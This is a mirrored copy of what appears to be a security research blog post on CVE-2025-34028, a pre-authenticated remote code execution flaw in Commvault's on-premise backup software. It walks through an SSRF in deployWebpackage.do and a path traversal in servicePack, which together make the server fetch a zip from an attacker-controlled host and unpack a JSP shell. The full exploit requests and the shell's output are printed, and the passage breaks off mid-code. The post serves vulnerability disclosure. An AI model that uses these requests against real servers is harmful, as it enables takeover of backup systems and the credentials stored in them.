<!DOCTYPE html><html lang=zh><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/libs/highlight/styles/18k.css><meta name=generator content="Hexo 7.3.0"></head><body id=bodyx><div class="hd posts"><a href=javascript:history.back() class=replay-btn>返回</a><div class=post-title><p>Commvault Remote Code Execution (CVE-2025-34028)</p><hr></div><div class=post-content><p>As we pack our bags and prepare for the adult-er version of BlackHat (that apparently doesn’t require us to print out stolen mailspoolz to hand to people at their talks), we want to tell you about a recent adventure - a heist, if you will.</p><p>No heist story is ever complete without a 10-metre thick steel door vault, silent pressure sensors beneath marble floors and laser grids slicing the air like spiderwebs — befitting of a crew reckless enough to think they can beat it all.</p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_4.jpg></p><p>Enterprises continue to seek solutions that offer strong security assurance for their backup data (and associated integration credentials) - especially when faced with their friendly neighbourhood ransomware gangs.</p><p>We’ve previously, publicly and privately, analysed vulnerabilities in various ‘Backup and Replication’ platforms, including those offered by Veeam and NAKIVO - both of which have struggled to avoid scrutiny and in some cases, even opting to patch issues silently.</p><p>However, we’re glad to see that sense prevails - kudos to NAKIVO for acknowledging <a target=_blank rel=noopener href=https://labs.watchtowr.com/the-best-security-is-when-we-all-agree-to-keep-everything-secret-except-the-secrets-nakivo-backup-replication-cve-2024-48248/ >CVE-2024-48248 from our previous research</a> and publicly responding to a new XXE vulnerability (<a target=_blank rel=noopener href="https://helpcenter.nakivo.com/Knowledge-Base/Content/Security-Advisory/CVE-2025-32406.htm?ref=labs.watchtowr.com">CVE-2025-32406</a>).</p><p>Backup and Replication solutions have become prime targets for ransomware operators for logical reasons — Veeam, for instance, has already seen widespread exploitation in the <a target=_blank rel=noopener href="https://thehackernews.com/2024/07/new-ransomware-group-exploiting-veeam.html?ref=labs.watchtowr.com">wild</a>.</p><p>After all, ransomware loses its sting if you can simply restore from a backup floppy disk— but what is the sysadmin to do if the floppy disk has also been compromised?</p><p>Once again, we feel an overwhelming urge to highlight that these solutions aren’t just valuable for the data they protect. Due to their automation and integration features, they often store credentials for privileged accounts across entire environments - just as we previously documented with NAKIVO.</p><p>Today, we’re turning our attention to another contender in the same arena — Commvault.</p><h2 id=What-Is-It><a href=#What-Is-It class=headerlink title="What Is It?"></a>What Is It?</h2><p>Commvault is a self-described Data Protection or Cyber Resilience solution; fancy words aside, product market review sites categorise Commvault as an Enterprise Backup and Replication suite. This ability to read tells us that Commvault offers integrations and supports a wide array of technologies, including <a target=_blank rel=noopener href="https://www.commvault.com/supported-technologies?ref=labs.watchtowr.com">cloud providers, databases, SOARs, hypervisors, and more</a>.</p><p>To gain an idea of the type of customers that use the Commvault solution, we can casually glance at their <a target=_blank rel=noopener href="https://www.commvault.com/customers?ref=labs.watchtowr.com">customer stories and logos</a> - quickly revealing that the target audience for their software includes large enterprises, MSPs, and human sweatshops.</p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_5.jpg></p><p>To sum up Commvault as a solution, we can’t help but echo their sentiment — a platform that confidently positions itself at the forefront of modern data protection:</p><blockquote><p>As your trusted partner, <strong>Commvault’s hardened, zero-trust protocols protect business data at its core while meeting the most stringent security standards for government agencies and business, alike</strong>.</p></blockquote><p>Hehe, zero-trust.</p><p>The more we explore, the more Commvault’s Backup and Recovery solution stands out as an appealing software target for schenanigans&#x2F;security research. Fortunately, it comes in two flavours: a ‘SaaS’ offering and, more interestingly, an <a target=_blank rel=noopener href="https://www.commvault.com/workloads/on-prem?ref=labs.watchtowr.com">on-premise edition</a>.</p><h2 id=Roll-Out-The-Blueprints><a href=#Roll-Out-The-Blueprints class=headerlink title="Roll Out The Blueprints"></a>Roll Out The Blueprints</h2><p>We installed the latest version of its Windows on-premise edition, specifically version <a target=_blank rel=noopener href="https://documentation.commvault.com/11.38/essential/list_of_innovation_update_releases_in_11_38.html?ref=labs.watchtowr.com">Innovation Release 11.38.20</a>.</p><p>As with all large appliances&#x2F;applications, it’s key to finding where we can interact with the functionality. Whilst there are several services running in this environment, such as:</p><ul><li>IIS - Port 81&#x2F;TCP</li><li>IIS - Port 82&#x2F;TCP</li><li>Core Application - Port 443&#x2F;TCP</li><li>Apache Solr - Port 20000&#x2F;TCP</li></ul><p>To locate the source of what is exposed on port 443, through a string of Windows commands, we can say with precision that the main application is running from a <code>Tomcat.exe</code> process from Drive <code>F:/</code></p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">C:\\Users\\Administrator&gt;netstat -ano | findstr :443<br>  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       3112<br>  TCP    [::]:443               [::]:0                 LISTENING       3112<br><br>----<br><br>C:\\Users\\Administrator&gt;tasklist /fi &quot;pid eq 3112&quot; /v<br><br>Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title<br>========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================<br>tomcat.exe                    3112 Services                   0  1,544,332 K Unknown         NT AUTHORITY\\NETWORK SERVICE                            0:01:44 N/A<br><br>C:\\Users\\Administrator&gt;wmic process where processid=&quot;3112&quot; get executablepath<br>ExecutablePath<br>F:\\Program Files\\Commvault\\ContentStore\\Apache\\bin\\tomcat.exe<br><br></code></pre></td></tr></table></figure><p>When we attempt to access our freshly deployed instance, we’re prompted to create the administrative user. Subsequently, unpredictably and annoyingly, we’re presented with the first barrier to entry: the login panel.</p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_6.jpg></p><p>2</p><h3 id=Casing-The-Joint><a href=#Casing-The-Joint class=headerlink title="Casing The Joint"></a>Casing The Joint</h3><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_7.jpg></p><p>Whenever reverse engineering applications for vulnerabilities, it’s a process; it’s going through the grooves to find its routes and endpoints, and asking yourself the all-important question - how can you interact with the application?</p><p>This varies from Nginx, Apache, Node, etc, but in this example, the initial contact is with an Apache Tomcat process, whose configuration lies within its <code>server.xml</code>.</p><p>Looking at the <code>server.xml</code> excerpt below, we can correlate the Tomcat application <code>Context paths</code> to their <code>docBase</code>, which tells us where the relevant files are for each route on disk. We’re making progress! :</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">Context path=&quot;&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/Apache/webapps/ROOT&quot; reloadable=&quot;false&quot;&gt;<br>          &lt;Manager pathname=&quot;&quot;/&gt;<br>        &lt;/Context&gt;<br>        &lt;Context path=&quot;/console&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/GUI&quot; reloadable=&quot;false&quot;&gt;<br>          &lt;Manager pathname=&quot;&quot;/&gt;<br>        &lt;/Context&gt;<br>        &lt;Context path=&quot;/downloads/sqlscripts&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/Metrics/scripts&quot; reloadable=&quot;false&quot;&gt;<br>          &lt;Manager pathname=&quot;&quot;/&gt;<br>        &lt;/Context&gt;<br>        &lt;Context path=&quot;/publicdownloads/sqlscripts&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/Metrics/public&quot; reloadable=&quot;false&quot;&gt;<br>          &lt;Manager pathname=&quot;&quot;/&gt;<br>        &lt;/Context&gt;<br>        &lt;Context path=&quot;/commandcenter&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/AdminConsole&quot; reloadable=&quot;false&quot;&gt;<br>          &lt;Manager pathname=&quot;&quot;/&gt;<br>          &lt;Resource name=&quot;BeanManager&quot; auth=&quot;Container&quot; type=&quot;javax.enterprise.inject.spi.BeanManager&quot; factory=&quot;org.jboss.weld.resources.ManagerObjectFactory&quot;/&gt;<br>        &lt;/Context&gt;<br>        &lt;Context path=&quot;/identity&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/identity&quot; reloadable=&quot;false&quot;&gt;<br>          &lt;Manager pathname=&quot;&quot;/&gt;<br>        &lt;/Context&gt;<br>        &lt;Context path=&quot;/CustomReportsEngine&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/CustomReportsEngine&quot; reloadable=&quot;false&quot;&gt;<br>          &lt;Manager pathname=&quot;&quot;/&gt;<br>        &lt;/Context&gt;<br>        &lt;Context path=&quot;/reports&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/Reports&quot; reloadable=&quot;false&quot;&gt;<br>          &lt;Manager pathname=&quot;&quot;/&gt;<br>        &lt;/Context&gt;<br>      &lt;/Host&gt; <br>    &lt;/Engine&gt;  <br><br></code></pre></td></tr></table></figure><p>Given how the application starts during the authentication phase, the main application resides within <code>/commandcenter</code>, which follows a typical Tomcat structure with a <code>web.xml</code> and <code>WEB-INF</code> directories etc.</p><p>Browsing whilst unauthenticated with our favourite HTTP proxy, we see several requests to endpoints using the <code>.do</code> extension, which typically indicates the usage of Apache Struts Framework - but this doesn’t appear to be true in the instance of Commvault, as there is no <code>struts.xml</code> which lays out all of the <code>.do</code> or <code>.action</code> endpoints.</p><p>When looking at the <code>web.xml</code> there are also no exact mapping of <code>.do</code> endpoints, there is a <code>context-param</code> for <code>scanPackage</code> which looks at certain class paths.</p><p>Taking an educated guess it could be looking for packages which register routes in some way.</p><p>Sometimes, during reverse engineering, going from source to sink can be cumbersome, so to speed up the process, we can work backwards by decompiling all of the <code>.jar</code> and <code>.class</code> files within the <code>lib</code> directory, and looking for endpoints that we <code>.do</code> know of.</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">&lt;context-param&gt;<br>  &lt;param-name&gt;scanPackage&lt;/param-name&gt;<br>  &lt;param-value&gt;commvault.web,commvault.cvmvc&lt;/param-value&gt;<br>&lt;/context-param&gt;<br><br></code></pre></td></tr></table></figure><p>After successfully decompiling all the libraries, we can grep through them for a path we’ve already observed (<code>sloCallBack.do</code>) within our HTTP proxy. Once we come across an example, it begins to make sense as to how the routing is instantiated:</p><p>Here’s an example from <code>cv-ac-core.jar</code> that’s relatively straightforward: the path <code>sloCallBack.do</code> and its <code>requestMethod</code> are mapped to the function <code>SLOCallBack</code>.</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">@RequestHandlerMethod(<br>   url = &quot;sloCallBack.do&quot;,<br>   requestMethod = &#123;RequestMethod.GET, RequestMethod.POST&#125;<br>)<br>public void SLOCallBack(HttpSession session, HttpServletRequest request, HttpServletResponse response) throws IOException &#123;<br>   String receivedRelayStateParam = request.getParameter(&quot;cvRelay&quot;);<br>   if (SSOLoginUtils.externalSiteLogoutEnabled(session)) &#123;<br>      this.loginService.handleExternalLogout(request, response);<br>   &#125; else &#123;<br>      boolean logoutSuccessStatus = StringUtils.equals(request.getParameter(&quot;LogoutErrorCode&quot;), &quot;0&quot;);<br>      SSOLoginUtils.doClientLogoutAndRedirectToIntendedPage(request, response, logoutSuccessStatus);<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>After extracting all of the routes from the decompiled libraries with some regex magic, we proceeded to blast them at the target instance to see what falls out.</p><p>However, we quickly realised that some level of authentication was in place, as the majority of routes are issued a status code <code>302</code> and redirecting us to authenticate via <code>/commandcenter/login/preSso.jsp.</code></p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_8.jpg></p><p>Using keywords from some of the routes we know we can reach due to their non-redirect-ing response, we come across a handy-named file in<code>ContentStore/AdminConsole/WEB-INF/classes/authSkipRules.xml</code> , which contains a list of endpoints excluded from auth filters, a total of 58 endpoints!</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">legalNotice.do<br>ssoLogin.do<br>login.do<br>feedback.do<br>contact.do<br>[..Truncated..]<br>metricsUpload.do<br>webpackage.do<br>deployWebpackage.do<br>deployServiceCommcell.do<br><br></code></pre></td></tr></table></figure><p>We can verify this by requesting each of these endpoints.</p><p>Results vary, but critically, they differ from the redirect to authenticate <code>/commandcenter/login/preSso.jsp</code>.</p><p>Response not requiring auth: (<code>/commandcenter/proxy.do</code>)</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">HTTP/1.1 900 <br>Strict-Transport-Security: max-age=31536000;includeSubDomains<br>X-Content-Type-Options: nosniff<br>X-XSS-Protection: 1; mode=block<br>Set-Cookie: JSESSIONID=331AB64D9DCB1A2684D0CD475CE7192E; Path=/commandcenter; Secure; HttpOnly<br>X-Frame-Options: SAMEORIGIN<br>Permissions-Policy: accelerometer=(); geolocation=(); gyroscope=(); microphone=(); payment=();<br>X-UA-Compatible: IE=Edge,chrome=1<br>Referrer-Policy: strict-origin-when-cross-origin<br>trace-id: fb3aaf23d74cd149ba827375f6e29e58<br>Set-Cookie: csrf=3e2d4412f5244bdca11f9027def59a6b; Path=/commandcenter; Secure<br>Cache-Control: no-store<br>vary: accept-encoding<br>Content-Type: text/html;charset=UTF-8<br>Content-Language: en-US<br>Date: Tue, 22 Apr 2025 15:00:08 GMT<br>Server: Commvault WebServer<br>Content-Length: 11737<br><br></code></pre></td></tr></table></figure><p>Response requiring auth: (<code>/commandcenter/cappsSubclients.do</code></p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">HTTP/1.1 302 <br>Strict-Transport-Security: max-age=31536000;includeSubDomains<br>X-Content-Type-Options: nosniff<br>X-XSS-Protection: 1; mode=block<br>Set-Cookie: JSESSIONID=CC45DD745D6571C778ADE996D3C5654E; Path=/commandcenter; Secure; HttpOnly<br>X-Frame-Options: SAMEORIGIN<br>Permissions-Policy: accelerometer=(); geolocation=(); gyroscope=(); microphone=(); payment=();<br>X-UA-Compatible: IE=Edge,chrome=1<br>Referrer-Policy: strict-origin-when-cross-origin<br>trace-id: b966805d19ad0f23c7a164b4c811a922<br>Location: /commandcenter/login/preSso.jsp<br>Content-Length: 0<br>Date: Tue, 22 Apr 2025 14:54:29 GMT<br><br><br></code></pre></td></tr></table></figure><h2 id=Deploying-Packages-Huh><a href=#Deploying-Packages-Huh class=headerlink title="Deploying Packages, Huh?"></a>Deploying Packages, Huh?</h2><p>As with all research, we have to have clear objectives; typically, we have two prime objectives when it comes to watchTowr style vulnerability research, akin to ‘<em>PoC or GTFO</em>‘:</p><ul><li>Is it pre-authenticated?</li><li>Is it Remote Code Execution?</li></ul><p>Having found endpoints and functionality that we can review to satisfy the first condition, it’s our calling to meet the crucial point of impact, Remote Code Execution in said identified endpoints and functionality.</p><p>The list of pre-authenticated endpoints was short enough to audit from sources to sinks until we found something interesting - but we’d be lying if we didn’t admit that went straight to the clearly bait endpoint - <code>deployWebpackage.do</code> .</p><p>The endpoint looks relatively straightforward as a <code>POST</code> request, which expects 3 parameters:</p><ul><li><code>commcellName</code>,</li><li><code>servicePack</code> and,</li><li><code>version</code></li></ul><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">@RequestHandlerMethod(<br>      url = &quot;deployWebpackage.do&quot;,<br>      requestMethod = &#123;RequestMethod.POST&#125;<br>  )<br>  public void deployWebPackage(@ReqParam(required = true) String commcellName, @ReqParam(required = true) String servicePack, @ReqParam(required = true) String version) throws Exception &#123;<br>      this.ccDeploySerivce.deployWebPackage(commcellName, servicePack, version);<br>  &#125;<br><br></code></pre></td></tr></table></figure><p>A sample request would look like the following:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">POST /commandcenter/deployWebpackage.do HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br>X-Requested-With: XMLHttpRequest<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 112<br><br>commcellName=commcellNameValue&amp;servicePack=servicePackValue&amp;version=versionValue<br><br></code></pre></td></tr></table></figure><p>Digging into the function widens our eyes as we see numerous Server-Side Request Forgery possibilities within <code>ccDeploySerivce.deployWebPackage</code> .</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">public void deployWebPackage(String commcellName, String servicePack, String version) throws Exception &#123;<br>     CloseableHttpClient client = null;<br><br>     try &#123;<br>         if (this.cvConfig.getDisableSSLForCCPackageDeploy()) &#123;<br>             client = HttpClientBuilder.create().setSSLContext((new SSLContextBuilder()).loadTrustMaterial((KeyStore)null, (x509Certificates, s) -&gt; &#123;<br>                 return true;<br>             &#125;).build()).setSSLHostnameVerifier(NoopHostnameVerifier.INSTANCE).build();<br>         &#125; else &#123;<br>             client = HttpClients.createDefault();<br>         &#125;<br><br>         String BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(&quot;&quot;), false);<br>         HttpGet request = new HttpGet(&quot;https://&quot; + commcellName + &quot;/commandcenter/webpackage.do&quot;); &lt;---- [0]<br>         request.addHeader(&quot;Accept&quot;, &quot;application/octet-stream&quot;);<br>         CloseableHttpResponse response = client.execute(request); &lt;---- [1]<br><br></code></pre></td></tr></table></figure><p>As we can see above</p><ul><li>At <code>[0]</code>, our parameter <code>commcellName</code> is concatenated into a URL as the hostname,</li><li>At <code>[1]</code> the server executes an HTTP request to this constructed URL.</li></ul><p>A very straightforward pre-auth Server-Side Request Forgery (SSRF) vulnerability, as there is no filtering limiting the hosts that can be communicated with.</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">POST /commandcenter/deployWebpackage.do HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br>X-Requested-With: XMLHttpRequest<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 112<br><br>commcellName=External-Controlled-Host.com&amp;servicePack=watchTowr&amp;version=x<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">GET /commandcenter/webpackage.do HTTP/1.1<br>Accept: application/octet-stream<br>Host: &#123;&#123;External-Controlled-Host.com&#125;&#125;<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.5)<br>Accept-Encoding: gzip,deflate<br><br></code></pre></td></tr></table></figure><h2 id=Escalate-The-Impact><a href=#Escalate-The-Impact class=headerlink title="Escalate The Impact!"></a>Escalate The Impact!</h2><p>This is cool, but it’s not RCE. What about the next block of code?</p><p>We can see lots of key file writing functions being called, such as <code>FileOutputStream</code> and <code>BufferedOutputStream</code> , perhaps it extends our SSRF to something more impactful.</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">try &#123;<br>      InputStream in = response.getEntity().getContent();  &lt;---- [2]<br>      String confPath = BASE_PATH + File.separator + &quot;Apache&quot; + File.separator + &quot;conf&quot; + File.separator + &quot;ccPackages&quot; + File.separator;<br>      String distCCPath = BASE_PATH + File.separator + &quot;AdminConsole&quot; + File.separator + &quot;dist-cc-sps&quot; + File.separator;<br>      File confDirectory = this.createDirectory(confPath + servicePack); &lt;---- [3]<br>      String var10002 = confDirectory.getAbsolutePath();<br>      File versionFile = new File(var10002 + File.separator + &quot;version.txt&quot;);<br>      FileUtils.writeStringToFile(versionFile, version, StandardCharsets.UTF_8, false);<br>      this.createDirectory(distCCPath);<br>      BufferedInputStream bis = new BufferedInputStream(in); &lt;---- [4]<br><br>      try &#123;<br>          FileOutputStream fos = new FileOutputStream(new File(confDirectory, &quot;dist-cc.zip&quot;)); &lt;---- [5]<br><br>          try &#123;<br>              BufferedOutputStream bos = new BufferedOutputStream(fos);<br><br>              try &#123;<br>                  byte[] buffer = new byte[1024];<br><br>                  int read;<br>                  while((read = bis.read(buffer)) != -1) &#123;<br>                      bos.write(buffer, 0, read);<br>[...Truncated...]<br><br>      bis.close();<br>      this.deployCCPackage(servicePack); &lt;---- [6]<br>      logger.info(&quot;Deployed web package successfully&quot;);<br><br></code></pre></td></tr></table></figure><p>Typically, in security testing, you want the functionality to succeed as much as possible, opening the attack surface to a broader and deeper processing net.</p><p>Attaching a debugger and following along with the execution allows us to see where points in time fail, and where we can correct our payloads for maximum success.</p><p>This particular function starts at <code>[2]</code>where we can observe the response from the SSRF request being stored to the <code>InputStream</code> variable <code>in</code>.</p><p>Moving further through the code with our debugger, we notice some directories are set using the value we define for the HTTP POST request parameter <code>servicePack</code> at<code>[3]</code> - however it happens to be caught in an exception with the following error:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">java.io.IOException: Failed to create directory /F:/Program Files/Commvault/ContentStore/\\Apache\\conf\\ccPackages\\hello<br><br></code></pre></td></tr></table></figure><p>We quickly realised that the pre-fixed directory <code>ccPackages</code> doesn’t exist within the <code>/Apache/</code> directory, which is causing it to fail.</p><p>Perhaps in the natural flow of utilising this functionality, the directory is created in the environment:</p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_9.jpg></p><p>However, with an offensive mindset, we can quickly manoeuvre over<code>[3]</code> and this error, by using a couple of path traversals in the <code>servicePack</code> parameter, eliminating this blocker as we’re now entering an existing directory:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">POST /commandcenter/deployWebpackage.do HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br>X-Requested-With: XMLHttpRequest<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 112<br><br>commcellName=External-Controlled-Host.com&amp;servicePack=../../Hello&amp;version=x<br><br></code></pre></td></tr></table></figure><p>With the function continuing in execution, the code begins to flow through file write operations. For example:</p><ol><li><code>[4</code>] The SSRF response stored earlier is now loaded into a <code>BufferedInputStream.</code></li><li><code>[5]</code>A new file is created at <code>[5]</code> specifically ,<code>dist-cc.zip</code>.</li><li>A <code>while</code> loop then begins processes to write this data to disk.</li></ol><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_10.jpg></p><p>Stepping out of the debugger for a moment, we can see a directory is created on the file system at <code>F:\\\\Program Files\\\\Commvault\\\\ContentStore\\\\Apache\\\\hello</code> with interesting contents.</p><p>Two files are within this directory:</p><ul><li>version.txt<ul><li>The contents of which consist of the value of the <code>version</code> parameter we supplied within the HTTP request.</li></ul></li><li>dist-cc.zip<ul><li>While not a valid zip file in the sense that we can extract it; however, opening this in Notepad shows the contents of the HTTP response from the externally controlled server that we supplied within the <code>commcellName</code> parameter.</li></ul></li></ul><p>Below shows each of the files open in Notepad for clarity:</p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_11.jpg></p><p>As mentioned before, a key to success is to complete function execution or as closely as possible; in this case, we move to the final function.</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">private void deployCCPackage(String servicePack) throws IOException &#123;<br>       String BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(&quot;&quot;), false);<br>       String CC_DEPLOY_PATH = BASE_PATH + File.separator + &quot;Apache&quot; + File.separator + &quot;conf&quot; + File.separator + &quot;ccPackages&quot; + File.separator;<br>       String DIST_CC_PATH = BASE_PATH + File.separator + &quot;AdminConsole&quot; + File.separator + &quot;dist-cc-sps&quot; + File.separator;<br>       String TEMP_DIR = servicePack + &quot;.tmp&quot; + File.separator + &quot;dist-cc&quot;;<br>       String SERVICEPACK_DEPLOY_PATH = DIST_CC_PATH + servicePack + &quot;.tmp&quot;; &lt;---- [7]<br>       File dir = new File(SERVICEPACK_DEPLOY_PATH);<br>       if (dir.exists()) &#123;<br>           FileUtils.deleteDirectory(dir);<br>       &#125;<br><br>   this.fileZipUtil.unzipFileWrtAbsPath(CC_DEPLOY_PATH + servicePack + File.separator + &quot;dist-cc.zip&quot;, DIST_CC_PATH + TEMP_DIR); &lt;---- [8]<br><br></code></pre></td></tr></table></figure><p>The start of the function <code>deployCCPackage</code> is purely an initialisation phase, in that directories and file paths are set for the rest of the function. Interestingly, though, looking at <code>[7]</code>, we can quickly see a new directory is set with a <code>.tmp</code> suffix; the debug output shows the location as</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">/F:/Program Files/Commvault/ContentStore/\\\\AdminConsole\\\\dist-cc-sps\\\\../../hello.tmp<br><br></code></pre></td></tr></table></figure><p>The function then takes the contents of <code>dist-cc.zip</code> and unzips it to the temp directory created previously. <code>[8]</code></p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">/F:/Program Files/Commvault/ContentStore/\\Apache\\conf\\ccPackages\\../../Hello.tmp\\dist-cc<br><br></code></pre></td></tr></table></figure><p>Resulting in a temporary directory with the following contents:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">PS F:\\Program Files\\Commvault\\ContentStore&gt; tree /f .\\Hello.tmp\\<br>Folder PATH listing for volume CVLT<br>F:\\PROGRAM FILES\\COMMVAULT\\CONTENTSTORE\\HELLO.TMP<br>    version.txt<br><br>No subfolders exist<br><br></code></pre></td></tr></table></figure><p>Until this point, the contents of the external server we control, injecting its response to this function, have been generic HTML content; now it’s time to use a zip file containing malicious <code>.jsp</code> files to see if we can achieve our initial objective of Remote Code Execution.</p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_12.jpg></p><h2 id=Zipping-Subterfuge><a href=#Zipping-Subterfuge class=headerlink title="Zipping Subterfuge!"></a>Zipping Subterfuge!</h2><p>To summarise, before we complete the heist:</p><ol><li>We send an HTTP request to <code>/commandcenter/deployWebpackage.do</code></li><li>This coerces the Commvault instance to fetch a ZIP file from our externally controlled server.</li><li>The contents of this zip file is unzipped to a <code>.tmp</code> directory we control.</li></ol><p>A theoretical path to victory here would be to:</p><ul><li>Create a zip file containing a malicious <code>.jsp</code> file</li><li>Host this zip file on an external HTTP server via the endpoint <code>/commandcenter/webpackage.do</code> <code>[0]</code></li><li>Use the <code>servicePack</code> parameter to traverse the <code>.tmp</code> directory into a pre-authenticated facing directory on the server, such as <code>../../Reports/MetricsUpload/shell</code>. We can ascertain this by referring back to the <code>server.xml</code> excerpt at the start of this article.</li></ul><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">&lt;Context path=&quot;/reports&quot; docBase=&quot;F:/Program Files/Commvault/ContentStore/Reports&quot; reloadable=&quot;false&quot;&gt;<br>  &lt;Manager pathname=&quot;&quot;/&gt;<br>&lt;/Context&gt;<br><br></code></pre></td></tr></table></figure><ul><li>Execute the SSRF via <code>/commandcenter/deployWebpackage.do</code> and see if our shell unzips.</li><li>Execute our shell from <code>/reports/MetricsUpload/shell/.tmp/dist-cc/dist-cc/shell.jsp</code></li></ul><p>Full Request:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">POST /commandcenter/deployWebpackage.do HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br>X-Requested-With: XMLHttpRequest<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 112<br><br>commcellName=external-host.com&amp;servicePack=../../Reports/MetricsUpload/shell/&amp;version=watchTowr<br><br></code></pre></td></tr></table></figure><p>The attacker-controlled external server is interacted with, the zip file is downloaded from our endpoint <code>/commandcenter/webpackage.do</code>, and we can double check to see the shell is unzipped into place:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">PS F:\\Program Files\\Commvault\\ContentStore\\Reports\\MetricsUpload\\shell&gt; tree /F<br>Folder PATH listing for volume CVLT<br>F:.<br>└───.tmp<br>    │   version.txt<br>    │<br>    └───dist-cc<br>        └───dist-cc<br>            │   watchTowr.jsp<br>            │<br>            └───ccApp<br>                    index.html<br><br></code></pre></td></tr></table></figure><p>Now, it’s just a case of triggering our shell…</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">GET /reports/MetricsUpload/shell/.tmp/dist-cc/dist-cc/watchTowr.jsp HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">HTTP/1.1 200 <br>Strict-Transport-Security: max-age=31536000;includeSubDomains<br>X-Frame-Options: SAMEORIGIN<br>X-Content-Type-Options: nosniff<br>X-XSS-Protection: 1; mode=block<br>Set-Cookie: JSESSIONID=49A48BB65CF9B96A0D691D545FB26911; Path=/reports; Secure; HttpOnly<br>Content-Type: text/plain;charset=UTF-8<br>Content-Length: 607<br>Date: Thu, 17 Apr 2025 02:19:18 GMT<br>Server: Commvault WebServer<br><br>2l8 b4by, watchTowr was here<br><br>SERVER INFORMATION:<br>------------------<br>Server Info: Apache Tomcat/10.1.31<br>Remote IP: 192.168.1.1<br>Session ID: 49A48BB65CF9B96A0D691D545FB26911<br>Timestamp: Thu Apr 17 02:19:18 UTC 2025<br><br><br></code></pre></td></tr></table></figure><p>And just like that, Pre-Authenticated Remote Code Execution in Commvault.</p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_13.jpg></p><p>Happy with this success, we checked the parallel endpoint within this controller, <code>deployServiceCommcell.do</code> which is a parallel mirror of <a target=_blank rel=noopener href="http://deploywebpackage.do/?ref=labs.watchtowr.com"><code>deployWebpackage.do</code></a> utilising a <code>updateDeployPackages</code> function which maintains one key difference!</p><p>Following a format as seen before, the endpoint is denoted within a <code>RequestHandlerMethod</code> the endpoint <a target=_blank rel=noopener href="http://deployservicecommcell.do/?ref=labs.watchtowr.com"><code>deployServiceCommcell.do</code></a> is of a <code>POST</code> method.</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">@RequestHandlerMethod(<br>    url = &quot;deployServiceCommcell.do&quot;,<br>    requestMethod = &#123;RequestMethod.POST&#125;<br>)<br>public void deployServiceCommcell(HttpServletRequest request) throws Exception &#123;<br>    this.ccDeploySerivce.updateDeployPackages(request);<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">public void updateDeployPackages(HttpServletRequest request) &#123;<br>        try &#123;<br>            Collection&lt;Part&gt; parts = 